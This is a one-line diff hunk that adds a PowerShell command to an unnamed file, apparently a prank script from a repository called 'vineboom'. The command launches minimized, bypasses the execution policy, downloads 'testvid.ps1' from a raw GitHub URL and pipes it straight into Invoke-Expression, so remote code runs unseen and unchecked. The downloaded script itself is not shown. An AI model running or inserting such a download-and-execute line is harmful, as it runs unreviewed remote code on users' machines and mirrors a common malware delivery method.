@@ -1,0 +1,1 @@
+powershell -WindowStyle Minimized -ExecutionPolicy Bypass -Command "& {[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/YeetTheAnson/vineboom/main/testvid.ps1' -UseBasicParsing | IEX}"
